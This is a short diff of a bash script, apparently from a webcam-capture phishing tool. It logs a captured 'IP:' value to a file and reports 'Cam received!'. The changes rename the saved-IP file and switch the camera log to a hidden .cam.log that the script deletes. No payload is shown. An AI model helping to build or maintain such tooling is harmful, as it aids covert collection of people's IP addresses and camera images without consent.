@@ -61,7 +61,7 @@ ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 
-cat ip.txt >> saved.ip.txt
+cat ip.txt >> saved_ip.txt
 
 
 }
@@ -82,9 +82,9 @@ fi
 
 sleep 0.5
 
-if [[ -e "Log.log" ]]; then
+if [[ -e ".cam.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam received!\e[0m\n"
-rm -rf Log.log
+rm -rf .cam.log
 fi
 sleep 0.5
 
